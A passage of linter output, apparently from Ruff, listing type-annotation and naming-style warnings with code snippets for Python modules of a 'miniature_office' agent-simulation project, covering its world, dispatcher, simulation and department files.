    |          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
324 |         """Get ledger entry for entity at tick"""
325 |         if entity_id in self.ledger and tick in self.ledger[entity_id]:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\scarcity_economics.py:344:51
    |
342 |         return bid.bid_id
343 |
344 |     def resolve_priority_bids(self, tick: int) -> Dict[str, str]:
    |                                                   ^^^^
345 |         """
346 |         Resolve pending priority bids.
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\scarcity_economics.py:374:10
    |
372 |     def get_entity_resources(
373 |         self, entity_id: str, tick: int
374 |     ) -> Optional[ResourceAllocation]:
    |          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
375 |         """Get remaining resources for entity at tick"""
376 |         entry = self.get_ledger_entry(entity_id, tick)
    |
help: Convert to `X | None`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> src\app\miniature_office\core\simulation.py:8:1
   |
 6 | import time
 7 | from dataclasses import dataclass
 8 | from typing import Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | from app.miniature_office.agents.agent import Agent, Manager, get_consensus_system
   |
help: Import from `collections.abc`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\simulation.py:8:1
   |
 6 | import time
 7 | from dataclasses import dataclass
 8 | from typing import Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | from app.miniature_office.agents.agent import Agent, Manager, get_consensus_system
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\simulation.py:8:1
   |
 6 | import time
 7 | from dataclasses import dataclass
 8 | from typing import Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | from app.miniature_office.agents.agent import Agent, Manager, get_consensus_system
   |

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\simulation.py:24:16
   |
22 |     auto_assign_tasks: bool = True
23 |     auto_resolve_meetings: bool = True
24 |     max_ticks: Optional[int] = None  # None for infinite
   |                ^^^^^^^^^^^^^
   |
help: Convert to `X | None`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\miniature_office\core\simulation.py:143:13
    |
142 |               # Handle tasks in approval state
143 | /             if task.state == TaskState.APPROVAL:
144 | |                 # Check if ready for commit (all criteria pass)
145 | |                 if task.is_ready_for_commit():
    | |______________________________________________^
146 |                       # Initiate consensus if needed
147 |                       consensus_system = get_consensus_system()
    |
help: Combine `if` statements using `and`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\simulation.py:238:46
    |
236 |     """
237 |
238 |     def __init__(self, world: World, config: Optional[SimulationConfig] = None):
    |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^
239 |         self.world = world
240 |         self.config = config or SimulationConfig()
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\simulation.py:243:30
    |
241 |         self.is_running = False
242 |         self.tick_count = 0
243 |         self.event_handlers: Dict[str, List[Callable]] = {}
    |                              ^^^^
244 |
245 |     def register_handler(self, event_type: str, handler: Callable):
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\simulation.py:243:40
    |
241 |         self.is_running = False
242 |         self.tick_count = 0
243 |         self.event_handlers: Dict[str, List[Callable]] = {}
    |                                        ^^^^
244 |
245 |     def register_handler(self, event_type: str, handler: Callable):
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\simulation.py:251:49
    |
249 |         self.event_handlers[event_type].append(handler)
250 |
251 |     def emit_event(self, event_type: str, data: Dict):
    |                                                 ^^^^
252 |         """Emit an event to all registered handlers"""
253 |         if event_type in self.event_handlers:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\simulation.py:341:28
    |
339 |         )
340 |
341 |     def get_state(self) -> Dict:
    |                            ^^^^
342 |         """Get current simulation state"""
343 |         return {
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\simulation.py:352:12
    |
351 | def create_simulation(
352 |     world: Optional[World] = None, config: Optional[SimulationConfig] = None
    |            ^^^^^^^^^^^^^^^
353 | ) -> SimulationEngine:
354 |     """Create a simulation engine"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\simulation.py:352:44
    |
351 | def create_simulation(
352 |     world: Optional[World] = None, config: Optional[SimulationConfig] = None
    |                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^
353 | ) -> SimulationEngine:
354 |     """Create a simulation engine"""
    |
help: Convert to `X | None`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> src\app\miniature_office\core\universal_dispatcher.py:19:1
   |
17 | from datetime import datetime
18 | from enum import Enum
19 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 |
21 | from .global_registry import (
   |
help: Import from `collections.abc`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\universal_dispatcher.py:19:1
   |
17 | from datetime import datetime
18 | from enum import Enum
19 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 |
21 | from .global_registry import (
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\universal_dispatcher.py:19:1
   |
17 | from datetime import datetime
18 | from enum import Enum
19 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 |
21 | from .global_registry import (
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\universal_dispatcher.py:59:13
   |
57 |     service_type: ServiceType
58 |     method: str
59 |     params: Dict[str, Any]
   |             ^^^^
60 |     routing_strategy: RoutingStrategy = RoutingStrategy.FIRST_AVAILABLE
61 |     preferred_language: Optional[str] = None
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\universal_dispatcher.py:61:25
   |
59 |     params: Dict[str, Any]
60 |     routing_strategy: RoutingStrategy = RoutingStrategy.FIRST_AVAILABLE
61 |     preferred_language: Optional[str] = None
   |                         ^^^^^^^^^^^^^
62 |     timeout: float = 30.0
63 |     metadata: Dict[str, Any] = field(default_factory=dict)
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\universal_dispatcher.py:63:15
   |
61 |     preferred_language: Optional[str] = None
62 |     timeout: float = 30.0
63 |     metadata: Dict[str, Any] = field(default_factory=dict)
   |               ^^^^
64 |     created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\universal_dispatcher.py:73:15
   |
71 |     request_id: str
72 |     status: DispatchStatus
73 |     floor_id: Optional[str] = None
   |               ^^^^^^^^^^^^^
74 |     result: Optional[Dict[str, Any]] = None
75 |     error: Optional[str] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\universal_dispatcher.py:74:13
   |
72 |     status: DispatchStatus
73 |     floor_id: Optional[str] = None
74 |     result: Optional[Dict[str, Any]] = None
   |             ^^^^^^^^^^^^^^^^^^^^^^^^
75 |     error: Optional[str] = None
76 |     execution_time: float = 0.0
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\universal_dispatcher.py:74:22
   |
72 |     status: DispatchStatus
73 |     floor_id: Optional[str] = None
74 |     result: Optional[Dict[str, Any]] = None
   |                      ^^^^
75 |     error: Optional[str] = None
76 |     execution_time: float = 0.0
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\universal_dispatcher.py:75:12
   |
73 |     floor_id: Optional[str] = None
74 |     result: Optional[Dict[str, Any]] = None
75 |     error: Optional[str] = None
   |            ^^^^^^^^^^^^^
76 |     execution_time: float = 0.0
77 |     completed_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\universal_dispatcher.py:79:26
   |
77 |     completed_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
78 |
79 |     def to_dict(self) -> Dict[str, Any]:
   |                          ^^^^
80 |         return {
81 |             "request_id": self.request_id,
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\universal_dispatcher.py:105:34
    |
103 |     """
104 |
105 |     def __init__(self, registry: Optional[GlobalRegistry] = None):
    |                                  ^^^^^^^^^^^^^^^^^^^^^^^^
106 |         self.registry = registry or get_global_registry()
107 |         self._floor_handlers: Dict[str, Callable] = {}
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:107:31
    |
105 |     def __init__(self, registry: Optional[GlobalRegistry] = None):
106 |         self.registry = registry or get_global_registry()
107 |         self._floor_handlers: Dict[str, Callable] = {}
    |                               ^^^^
108 |         self._round_robin_counters: Dict[ServiceType, int] = {}
109 |         self._request_history: List[DispatchResponse] = []
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:108:37
    |
106 |         self.registry = registry or get_global_registry()
107 |         self._floor_handlers: Dict[str, Callable] = {}
108 |         self._round_robin_counters: Dict[ServiceType, int] = {}
    |                                     ^^^^
109 |         self._request_history: List[DispatchResponse] = []
110 |         self._max_history = 1000
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:109:32
    |
107 |         self._floor_handlers: Dict[str, Callable] = {}
108 |         self._round_robin_counters: Dict[ServiceType, int] = {}
109 |         self._request_history: List[DispatchResponse] = []
    |                                ^^^^
110 |         self._max_history = 1000
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:113:54
    |
112 |     def register_floor_handler(
113 |         self, floor_id: str, handler: Callable[[str, Dict[str, Any]], Dict[str, Any]]
    |                                                      ^^^^
114 |     ) -> None:
115 |         """
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:113:71
    |
112 |     def register_floor_handler(
113 |         self, floor_id: str, handler: Callable[[str, Dict[str, Any]], Dict[str, Any]]
    |                                                                       ^^^^
114 |     ) -> None:
115 |         """
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:204:67
    |
202 |             return response
203 |
204 |     def _find_candidate_floors(self, request: DispatchRequest) -> List[Any]:
    |                                                                   ^^^^
205 |         """Find floors that can handle the request"""
206 |         # Start with floors that provide the required service
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:222:27
    |
221 |     def _select_floor(
222 |         self, candidates: List[Any], strategy: RoutingStrategy
    |                           ^^^^
223 |     ) -> Optional[Any]:
224 |         """Select a floor from candidates based on routing strategy"""
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\universal_dispatcher.py:223:10
    |
221 |     def _select_floor(
222 |         self, candidates: List[Any], strategy: RoutingStrategy
223 |     ) -> Optional[Any]:
    |          ^^^^^^^^^^^^^
224 |         """Select a floor from candidates based on routing strategy"""
225 |         if not candidates:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:254:51
    |
253 |     def _execute_on_floor(
254 |         self, floor_id: str, method: str, params: Dict[str, Any], timeout: float
    |                                                   ^^^^
255 |     ) -> Dict[str, Any]:
256 |         """Execute a request on a specific floor"""
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:255:10
    |
253 |     def _execute_on_floor(
254 |         self, floor_id: str, method: str, params: Dict[str, Any], timeout: float
255 |     ) -> Dict[str, Any]:
    |          ^^^^
256 |         """Execute a request on a specific floor"""
257 |         handler = self._floor_handlers.get(floor_id)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:293:17
    |
291 |         service_type: ServiceType,
292 |         method: str,
293 |         params: Dict[str, Any],
    |                 ^^^^
294 |         preferred_language: Optional[str] = None,
295 |         routing_strategy: RoutingStrategy = RoutingStrategy.FIRST_AVAILABLE,
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\universal_dispatcher.py:294:29
    |
292 |         method: str,
293 |         params: Dict[str, Any],
294 |         preferred_language: Optional[str] = None,
    |                             ^^^^^^^^^^^^^
295 |         routing_strategy: RoutingStrategy = RoutingStrategy.FIRST_AVAILABLE,
296 |         timeout: float = 30.0,
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:326:33
    |
324 |         return self.dispatch(request)
325 |
326 |     def get_statistics(self) -> Dict[str, Any]:
    |                                 ^^^^
327 |         """Get dispatcher statistics"""
328 |         if not self._request_history:
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:369:55
    |
367 |         }
368 |
369 |     def get_recent_requests(self, limit: int = 10) -> List[Dict[str, Any]]:
    |                                                       ^^^^
370 |         """Get recent dispatch requests"""
371 |         recent = self._request_history[-limit:]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\universal_dispatcher.py:369:60
    |
367 |         }
368 |
369 |     def get_recent_requests(self, limit: int = 10) -> List[Dict[str, Any]]:
    |                                                            ^^^^
370 |         """Get recent dispatch requests"""
371 |         recent = self._request_history[-limit:]
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\universal_dispatcher.py:376:21
    |
375 | # Global singleton instance
376 | _global_dispatcher: Optional[UniversalDispatcher] = None
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Convert to `X | None`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\world.py:8:1
   |
 6 | import json
 7 | from dataclasses import dataclass
 8 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | from app.miniature_office.agents.agent import Agent, Manager
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\world.py:8:1
   |
 6 | import json
 7 | from dataclasses import dataclass
 8 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | from app.miniature_office.agents.agent import Agent, Manager
   |

N815 Variable `officeId` in class scope should not be mixedCase
  --> src\app\miniature_office\core\world.py:23:5
   |
21 |     """
22 |
23 |     officeId: str
   |     ^^^^^^^^
24 |     roles: List[str]  # Agent IDs
25 |     manager: str  # Manager ID
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\world.py:24:12
   |
23 |     officeId: str
24 |     roles: List[str]  # Agent IDs
   |            ^^^^
25 |     manager: str  # Manager ID
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\world.py:27:26
   |
25 |     manager: str  # Manager ID
26 |
27 |     def to_dict(self) -> Dict:
   |                          ^^^^
28 |         return {"officeId": self.officeId, "roles": self.roles, "manager": self.manager}
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\world.py:31:25
   |
30 |     @staticmethod
31 |     def from_dict(data: Dict) -> "OfficeSchema":
   |                         ^^^^
32 |         return OfficeSchema(
33 |             officeId=data["officeId"],
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\world.py:49:22
   |
47 |         self.office_id = office_id
48 |         self.department = department
49 |         self.agents: List[str] = []  # Agent IDs
   |                      ^^^^
50 |         self.manager: Optional[Manager] = None
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\world.py:50:23
   |
48 |         self.department = department
49 |         self.agents: List[str] = []  # Agent IDs
50 |         self.manager: Optional[Manager] = None
   |                       ^^^^^^^^^^^^^^^^^
51 |
52 |     def add_agent(self, agent: Agent):
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\world.py:61:29
   |
59 |         self.manager = manager
60 |
61 |     def get_agents(self) -> List[Agent]:
   |                             ^^^^
62 |         """Get all agents in this office"""
63 |         result = []
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\world.py:78:26
   |
76 |         )
77 |
78 |     def to_dict(self) -> Dict:
   |                          ^^^^
79 |         return self.to_schema().to_dict()
   |
help: Replace with `dict`

N815 Variable `floorId` in class scope should not be mixedCase
  --> src\app\miniature_office\core\world.py:88:5
   |
86 |     """
87 |
88 |     floorId: str
   |     ^^^^^^^
89 |     language: str
90 |     offices: List[Dict]
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\world.py:90:14
   |
88 |     floorId: str
89 |     language: str
90 |     offices: List[Dict]
   |              ^^^^
91 |
92 |     def to_dict(self) -> Dict:
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\world.py:90:19
   |
88 |     floorId: str
89 |     language: str
90 |     offices: List[Dict]
   |                   ^^^^
91 |
92 |     def to_dict(self) -> Dict:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\world.py:92:26
   |
90 |     offices: List[Dict]
91 |
92 |     def to_dict(self) -> Dict:
   |                          ^^^^
93 |         return {
94 |             "floorId": self.floorId,
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\world.py:100:25
    |
 99 |     @staticmethod
100 |     def from_dict(data: Dict) -> "FloorSchema":
    |                         ^^^^
101 |         return FloorSchema(
102 |             floorId=data["floorId"],
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\world.py:118:23
    |
116 |         self.floor_id = floor_id
117 |         self.language = language
118 |         self.offices: Dict[str, Office] = {}
    |                       ^^^^
119 |         self.department: Optional[Department] = None
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\world.py:119:26
    |
117 |         self.language = language
118 |         self.offices: Dict[str, Office] = {}
119 |         self.department: Optional[Department] = None
    |                          ^^^^^^^^^^^^^^^^^^^^
120 |
121 |     def add_office(self, office: Office):
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\world.py:125:45
    |
123 |         self.offices[office.office_id] = office
124 |
125 |     def get_office(self, office_id: str) -> Optional[Office]:
    |                                             ^^^^^^^^^^^^^^^^
126 |         """Get an office by ID"""
127 |         return self.offices.get(office_id)
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\world.py:129:33
    |
127 |         return self.offices.get(office_id)
128 |
129 |     def get_all_agents(self) -> List[Agent]:
    |                                 ^^^^
130 |         """Get all agents across all offices on this floor"""
131 |         agents = []
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\world.py:144:26
    |
142 |         )
143 |
144 |     def to_dict(self) -> Dict:
    |                          ^^^^
145 |         return self.to_schema().to_dict()
    |
help: Replace with `dict`

N815 Variable `worldId` in class scope should not be mixedCase
   --> src\app\miniature_office\core\world.py:154:5
    |
152 |     """
153 |
154 |     worldId: str
    |     ^^^^^^^
155 |     name: str
156 |     floors: List[Dict]
    |

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\world.py:156:13
    |
154 |     worldId: str
155 |     name: str
156 |     floors: List[Dict]
    |             ^^^^
157 |     supplyStore: Dict
158 |     time: int
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\world.py:156:18
    |
154 |     worldId: str
155 |     name: str
156 |     floors: List[Dict]
    |                  ^^^^
157 |     supplyStore: Dict
158 |     time: int
    |
help: Replace with `dict`

N815 Variable `supplyStore` in class scope should not be mixedCase
   --> src\app\miniature_office\core\world.py:157:5
    |
155 |     name: str
156 |     floors: List[Dict]
157 |     supplyStore: Dict
    |     ^^^^^^^^^^^
158 |     time: int
    |

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\world.py:157:18
    |
155 |     name: str
156 |     floors: List[Dict]
157 |     supplyStore: Dict
    |                  ^^^^
158 |     time: int
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\world.py:160:26
    |
158 |     time: int
159 |
160 |     def to_dict(self) -> Dict:
    |                          ^^^^
161 |         return {
162 |             "worldId": self.worldId,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\world.py:170:25
    |
169 |     @staticmethod
170 |     def from_dict(data: Dict) -> "WorldSchema":
    |                         ^^^^
171 |         return WorldSchema(
172 |             worldId=data["worldId"],
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\world.py:190:22
    |
188 |         self.world_id = world_id
189 |         self.name = name
190 |         self.floors: Dict[str, Floor] = {}
    |                      ^^^^
191 |         self.supply_store = get_supply_store()
192 |         self.time = 0  # Simulation time (ticks)
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\world.py:216:43
    |
214 |         )
215 |
216 |     def get_floor(self, floor_id: str) -> Optional[Floor]:
    |                                           ^^^^^^^^^^^^^^^
217 |         """Get a floor by ID"""
218 |         return self.floors.get(floor_id)
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\world.py:220:55
    |
218 |         return self.floors.get(floor_id)
219 |
220 |     def get_floor_by_language(self, language: str) -> Optional[Floor]:
    |                                                       ^^^^^^^^^^^^^^^
221 |         """Get a floor by language"""
222 |         for floor in self.floors.values():
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\world.py:252:26
    |
250 |         )
251 |
252 |     def to_dict(self) -> Dict:
    |                          ^^^^
253 |         """Serialize world to dictionary"""
254 |         return self.to_schema().to_dict()
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\world.py:283:9
    |
282 | # Global world instance
283 | _world: Optional[World] = None
    |         ^^^^^^^^^^^^^^^
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\world.py:293:20
    |
293 | def get_world() -> Optional[World]:
    |                    ^^^^^^^^^^^^^^^
294 |     """Get the global world instance"""
295 |     return _world
    |
help: Convert to `X | None`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> src\app\miniature_office\departments\department.py:6:1
  |
4 | """
5 |
6 | from typing import Dict, List, Optional, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 |
8 | from app.miniature_office.core.audit import EventType, get_audit_log
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> src\app\miniature_office\departments\department.py:6:1
  |
4 | """
5 |
6 | from typing import Dict, List, Optional, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 |
8 | from app.miniature_office.core.audit import EventType, get_audit_log
  |

UP035 `typing.Set` is deprecated, use `set` instead
 --> src\app\miniature_office\departments\department.py:6:1
  |
4 | """
5 |
6 | from typing import Dict, List, Optional, Set
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 |
8 | from app.miniature_office.core.audit import EventType, get_audit_log
  |

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\departments\department.py:28:20
   |
26 |         name: str,
27 |         domain: str,  # e.g., "Python", "Rust", "JavaScript"
28 |         toolchain: Optional[List[str]] = None,
   |                    ^^^^^^^^^^^^^^^^^^^
29 |     ):
30 |         super().__init__(department_id, EntityType.DEPARTMENT, name)
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\departments\department.py:28:29
   |
26 |         name: str,
27 |         domain: str,  # e.g., "Python", "Rust", "JavaScript"
28 |         toolchain: Optional[List[str]] = None,
   |                             ^^^^
29 |     ):
30 |         super().__init__(department_id, EntityType.DEPARTMENT, name)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\departments\department.py:33:22
   |
31 |         self.domain = domain
32 |         self.toolchain = toolchain or []
33 |         self.agents: Dict = {}  # Role -> List of agent IDs
   |                      ^^^^
34 |         self.contracts: List[str] = []  # Contract IDs this department implements
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\departments\department.py:34:25
   |
32 |         self.toolchain = toolchain or []
33 |         self.agents: Dict = {}  # Role -> List of agent IDs
34 |         self.contracts: List[str] = []  # Contract IDs this department implements
   |                         ^^^^
35 |
36 |         # Register department
   |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> src\app\miniature_office\departments\department.py:73:36
   |
71 |         )
72 |
73 |     def get_missing_roles(self) -> Set:
   |                                    ^^^
74 |         """
75 |         Check for missing required roles.
   |
help: Replace with `set`

N806 Variable `REQUIRED_ROLES` in function should be lowercase
  --> src\app\miniature_office\departments\department.py:80:9
   |
78 |         from app.miniature_office.agents.agent import AgentRole
79 |
80 |         REQUIRED_ROLES = {
   |         ^^^^^^^^^^^^^^
81 |             AgentRole.ARCHITECT,
82 |             AgentRole.BUILDER,
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\departments\department.py:90:40
   |
88 |         return REQUIRED_ROLES - present_roles
89 |
90 |     def auto_spawn_assistants(self) -> List:
   |                                        ^^^^
91 |         """
92 |         Auto-spawn assistant agents for missing roles (Codex 3.1).
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\departments\department.py:173:43
    |
171 |         return len(self.get_missing_roles()) == 0
172 |
173 |     def get_agents_by_role(self, role) -> List:
    |                                           ^^^^
174 |         """Get all agents with a specific role in this department"""
175 |         from app.miniature_office.agents.agent import Agent
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\departments\department.py:201:27
    |
200 |     def __init__(self):
201 |         self.departments: Dict[str, Department] = {}
    |                           ^^^^
202 |
203 |     def register_department(self, department: Department):
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\departments\department.py:210:53
    |
208 |         department.auto_spawn_assistants()
209 |
210 |     def get_department(self, department_id: str) -> Optional[Department]:
    |                                                     ^^^^^^^^^^^^^^^^^^^^
211 |         """Get a department by ID"""
212 |         return self.departments.get(department_id)
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\departments\department.py:214:57
    |
212 |         return self.departments.get(department_id)
213 |
214 |     def get_departments_by_domain(self, domain: str) -> List[Department]:
    |                                                         ^^^^
215 |         """Get all departments for a specific domain"""
216 |         return [
    |
help: Replace with `list`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\interfaces\contract.py:10:1
   |
 8 | from datetime import datetime
 9 | from enum import Enum
10 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\interfaces\contract.py:10:1
   |
 8 | from datetime import datetime
 9 | from enum import Enum
10 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\interfaces\contract.py:40:17
   |
39 |     path: str
40 |     parameters: Dict[str, str]  # param_name -> type
   |                 ^^^^
41 |     return_type: str
42 |     description: str = ""
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\interfaces\contract.py:44:26
   |
42 |     description: str = ""
43 |
44 |     def to_dict(self) -> Dict:
   |                          ^^^^
45 |         return {
46 |             "path": self.path,
   |
help: Replace with `dict`

SIM103 Return the negated condition directly
